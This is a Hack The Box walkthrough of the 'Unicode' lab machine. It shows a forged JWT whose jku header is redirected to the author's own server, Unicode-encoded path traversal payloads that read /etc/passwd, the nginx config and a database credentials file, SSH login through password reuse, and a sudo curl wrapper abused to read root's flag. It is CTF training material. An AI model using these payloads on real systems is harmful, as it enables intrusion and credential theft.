---
title: "Hack The Box - Unicode Walkthrough"
date: 2022-05-07T21:00:00+02:00
description: "Hack The Box Unicode Walkthrough/Write-Up"
featured: false
draft: false
toc: false
# menu: main
usePageBundles: false
featureImage: "/images/unicode_htb.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/unicode_htb.png"
shareImage: "/images/unicode_htb.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Walkthroughs
tags:
  - Hack the Box
  - Linux
---
Hello everyone, today we are going to take a look at Unicode from Hack The Box. Unicode is a medium box that involves JWT manipulation, local file inclusion and a custom made application that can be used to access the root flag.

## Foothold
As usual, we start off with an nmap scan to enumerate all ports, services and their versions.

```sh
nmap -sC -sV -p- -oA nmap/initial unicode.htb
```

Which provides us with the following results. Port 80 and port 22 are open. 

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 503
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 22 is running an up-to-date version of SSH, so we will ignore it. Let's visit the web service on port 80.  When navigating to the webpage, we are greeted with a homepage that allows us to login and register an account. We register an account and login onto the platform. 

The page allows us to upload threat reports in pdf format. Let's create a dummy pdf file by changing the file extension to .pdf, and upload it. I use BurpSuite to intercept the requests. After clicking "submit" we see a "Thank You!" page pop up. Let's look at the request that was sent to the server. 

```http
POST /upload/ HTTP/1.1
Host: 10.129.112.121
Content-Length: 199
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.112.121
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7wYS2UCanGIcgCS3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.112.121/upload/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWVncmFoIn0.LGwha066KOibtf_2cKPsz980i1ndLz38FWnyV8BiK9yYZ9oza1SlTuDznaQUzkMFtsIPdn1Y5-JRFZlH-PE4vVfvZnvbKsKiN3iQgI-QQrVmbelWcjXqKoUZ24JyxHej6Azwn9eh0JcPW6BIvfEAps7o5jR4x8xNKnXtVkpWP-rtw9UQVh1SNFtu86s7kcPriSEOmEq6s8SPSimAkNXDzaqPdZ1vg3MbGGQn09PTuLpTAiGW2CsJkDfYme_WDL5pV1MBf7AGGNNDdAcGkZWO4gDOsS_ylK5r7m8rtC2j2mmtlBTUDrZ6Hq83Vmt3RBA-W43GYnb1vUwRpaXmKPPDag
Connection: close

------WebKitFormBoundary7wYS2UCanGIcgCS3

Content-Disposition: form-data; name="threat_report"; filename="file.pdf"

Content-Type: application/pdf

hi

------WebKitFormBoundary7wYS2UCanGIcgCS3--
```

Right away I notice the length of the auth cookie, and notice that it could be base64 encoded. Let's decode it and see what it contains.

```sh
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWVncmFoIn0.LGwha066KOibtf_2cKPsz980i1ndLz38FWnyV8BiK9yYZ9oza1SlTuDznaQUzkMFtsIPdn1Y5-JRFZlH-PE4vVfvZnvbKsKiN3iQgI-QQrVmbelWcjXqKoUZ24JyxHej6Azwn9eh0JcPW6BIvfEAps7o5jR4x8xNKnXtVkpWP-rtw9UQVh1SNFtu86s7kcPriSEOmEq6s8SPSimAkNXDzaqPdZ1vg3MbGGQn09PTuLpTAiGW2CsJkDfYme_WDL5pV1MBf7AGGNNDdAcGkZWO4gDOsS_ylK5r7m8rtC2j2mmtlBTUDrZ6Hq83Vmt3RBA-W43GYnb1vUwRpaXmKPPDag" | base64 -d
```

Which displays the following information.

```text
{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/jwks.json"}
```

We are dealing with JSON Web Tokens (JWT). We see that the jku points to "http://hackmedia.htb/static/jwks.json". The jku (JWK Set URL) Header Parameter is a URI that refers to a resource for a set of JSON-encoded public keys, one of which corresponds to the key used to digitally sign the JWS (JSON Web Signature) [Source](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c). Let's add hackmedia.htb to our /etc/hosts file and download the jwks.json file.

```sh
wget http://hackmedia.htb/static/jwks.json
```

The jwks.json contains the following contents.

```json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

Let's do conduct some research into JWT tokens and how to exploit misconfigurations. For this I end up at [this hacktricks article](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens). We see that the JWT uses a key identifier (kid), and that it could be vulnerable to token tampering. For this we need to point the jku value to a web service we can monitor, and create our own public key and JWT.

```sh
openssl genrsa -out keypair.pem 2048
```

Now we can create a simple python script to generate ourself a JWT. For this we pip install jwcrypto and look at the documentation.

```python
from jwcrypto import jwk,jwt

with open("keypair.pem", "rb") as pem:
        key = jwk.JWK.from_pem(pem.read())

print(key)
print("n:", key.n)
print("e:", key.e)
```

Which outputs the following token.

```text
{"kid":"IXk1gLQrMtKG-NzkfjPQzNCBEZLsdZ6xduMGDfIHkY8","thumbprint":"IXk1gLQrMtKG-NzkfjPQzNCBEZLsdZ6xduMGDfIHkY8"}
n: 5Q6n0NrjZEtIn04qtzw7KJFOPBha_Fp6bI51K9nL98EjH5WOtx7GIxZ2ETu0GY_HdecxrmXpJcpbAcBzarInLDVMb6wtnpKoOZ86Zba_EAbOThElEhvx58TZFY7iNwGo50paHTfzRvMxrGGtRiMNgJoB3f4FpOawIRZTJL0twHl0Nqe43lKcGYeOLL1cNV5qf4dbb665ArSdfBYv33Rmu38NUwd-qOBfCkEE-lRw7OmgaFxIJQdrU1KMATXEtOxBXnGAeqg6ALLjdD8q-F6RTBK7zKiym179meHk_y2XYOxpUKObiRebvPY1nwvKfmxbAYtdY-8-KKimf1RVWSZhzQ
e: AQAB
```

We can now alter the kid and "n" of the existent jwks.json with the contents that we generated. By doing so, our modified jwks.json file looks as follows.

```json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "IXk1gLQrMtKG-NzkfjPQzNCBEZLsdZ6xduMGDfIHkY8",
            "alg": "RS256",
            "n": "5Q6n0NrjZEtIn04qtzw7KJFOPBha_Fp6bI51K9nL98EjH5WOtx7GIxZ2ETu0GY_HdecxrmXpJcpbAcBzarInLDVMb6wtnpKoOZ86Zba_EAbOThElEhvx58TZFY7iNwGo50paHTfzRvMxrGGtRiMNgJoB3f4FpOawIRZTJL0twHl0Nqe43lKcGYeOLL1cNV5qf4dbb665ArSdfBYv33Rmu38NUwd-qOBfCkEE-lRw7OmgaFxIJQdrU1KMATXEtOxBXnGAeqg6ALLjdD8q-F6RTBK7zKiym179meHk_y2XYOxpUKObiRebvPY1nwvKfmxbAYtdY-8-KKimf1RVWSZhzQ",
            "e": "AQAB"
        }
    ]
}
```

Now we have to create a signed token with the generated key. We use the available code snippet available from [jwcrypto.readthedocs.io](https://jwcrypto.readthedocs.io/en/latest/jwt.html) in conjunction with the code we just wrote.

```python
from jwcrypto import jwk,jwt

with open("keypair.pem", "rb") as pem:
        key = jwk.JWK.from_pem(pem.read())

Token = jwt.JWT(header={"alg":"RS256","jku":"http://hackmedia.htb/static/../redirect/?url=10.10.14.67:8000/jwks.json"}, claims={"user":"admin"})
Token.make_signed_token(key)
Token.serialize()
print(Token.serialize())
```

The code above tries to accomplish two things. It tries to impersonate the admin user by adding the "user":"admin" claims, and it exploits the redirect function available on the webpage to redirect the webpage to our hosted webserver. This redirect misuse was found by looking at the source code of the default http://hackmedia.htb/ webpage, and finding the following href.

```js
<a href="/redirect/?url=google.com"
```

Let's host our webserver on port 8000, and run the python script to print our serialized token.

```sh
python3 -m http.server 8000

python3 jwt.py
```

We get the following token.

```text
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPWh0dHA6Ly8xMC4xMC4xNC42Nzo4MDAwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.nvKt8murNM2rOebQ1azCQehowAkrg5_U3WlRa8Byuil-UPmsAP8MyI1OijHg7XNQ9RJvj4RXMQEVQa_iXO_ESbWRMl7fQ2qEWyU6999ho-OXeLVUNhjMCFic_YFPa5C6qUOSk0fLwojhA2cR3NrSpdZ0UcnfGZGRVPhiD_NMIPG_m4QiaFwuIYllFeLk61z9dqCBtDSJfl9zWu51WHcu9gAuUOMb4_RUWABntf8SrQ-hWzoxWhwp3A3D6E8_H9-jzudAr6Nk70sMpXaDdnBdGkMqI4v4PypGKDhqdUIQAP2ewXN92rOGuJSexVfybyCPbmudJs04mDn8v255Tp3KqA
```

Let's now login to the webpage, and change the auth value to our newly generated JWT. I accomplish this by using the cookie editor plugin for firefox, but you can probably also use BurpSuite for this. I change the auth token, and refresh the page. 

```text
10.129.112.121 - - [05/Apr/2022 18:17:13] "GET /jwks.json HTTP/1.1" 200 -
```

And we are greeted with an administrator page! There are two reports saved on the webpage, as the following URLs.

```text
http://hackmedia.htb/display/?page=monthly.pdf
http://hackmedia.htb/display/?page=quarterly.pdf
```

The moment I see this, the first few words that pop to mind are local and remote file inclusion. Let's test for local file inclusion by specifying /etc/passwd as payload. Unfortunately we get a 404 not found. Given the name of the box (Unicode), we should maybe try out unicode encoded file inclusion. I try the following payload:

```text
http://hackmedia.htb/display/?page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

And see the following results.

```text
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false code:x:1000:1000:,,,:/home/code:/bin/bash 
```

Nice! We found a local file inclusion vulnerability. We can see that there is a user called "code". Let's see if he has a private key stored in his home directory. 

```text
http://hackmedia.htb/display/?page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fhome%ef%bc%8fcode%ef%bc%8f.ssh%ef%bc%8fid_rsa
```

Unfortunately, no luck. We saw from the nmap scan that the web server is hosted on Nginx. Let's take a look at the Nginx configuration to see whether we can find some  credentials or other information. Let's take a look at the default site within sites-enabled.

```HTTP
GET /display/?page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fnginx%ef%bc%8fsites-enabled%ef%bc%8fdefault HTTP/1.1
```

Which shows us the following contents.

```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 05 Apr 2022 16:29:53 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 432

limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s;

server{
#Change the Webroot from /home/code/app/ to /var/www/html/
#change the user password from db.yaml
  listen 80;
  error_page 503 /rate-limited/;
  location / {
                limit_req zone=mylimit;
    proxy_pass http://localhost:8000;
    include /etc/nginx/proxy_params;
    proxy_redirect off;
  }
  location /static/{
    alias /home/code/coder/static/styles/;
  }
}
```

We can see two comments. One stating that the webroot should be changed from /home/code/app to /var/www/html, and the otherone that the user password from db.yaml has to be changed. Looks like we should try to access the db.yaml file.

```HTTP
GET /display/?page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fhome%ef%bc%8fcode%ef%bc%8fcoder%ef%bc%8fdb.yaml HTTP/1.1
```

Which responds with the following.

```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 05 Apr 2022 16:32:03 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 95

mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stxxxxx@@!"
mysql_db: "user"
```

We found credentials! We can test for password reuse by using the username we found in the /etc/passwd file (code), with the password found above. 

```sh
ssh code@unicode.htb
```

And we are in.

## Privilege Escalation
One of the first things to check when getting onto a box for privilege escalation would be sudo -l. 

```sh
code@code:~$ sudo -l

>> User code may run the following commands on code:
>> (root) NOPASSWD: /usr/bin/treport
```

I run the /usr/bin/treport file, and get the following menu.

```sh
code@code:~$ sudo /usr/bin/treport

1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.

Enter your choice:4
```

We try to use option 2, and see that we are allowed to input file names to read. We attempt to read the root.txt flag.

```sh
code@code:~$ sudo /usr/bin/treport

1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.

Enter your choice:3

Enter the IP/file_name:/root/root.txt

curl: (3) URL using bad/illegal format or missing URL
```

The tool is picky, and wants us to specify File:///root/root.txt instead as it uses Curl.

```sh
code@code:~$ sudo /usr/bin/treport

1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.

Enter your choice:3

Enter the IP/file_name:File:///root/root.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0   8250      0 --:--:-- --:--:-- --:--:--  8250
```

It looks like our file is downloaded. Let's use the tool to read the file.

```sh
code@code:~$ sudo /usr/bin/treport

1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.

Enter your choice:3

ALL THE THREAT REPORTS:
threat_report_16_40_40

Enter the filename: threat_report_16_40_40

74fe5exxxxxxxxxxx783a7d5xxxx4f3
```

And we found our root.txt as well. You could argue that the box is not over before you get an actual root shell, but I'll leave it here, as it seems asif this was the intended route of the box. I hope you enjoyed this walkthrough, and as always, see you at the next one! 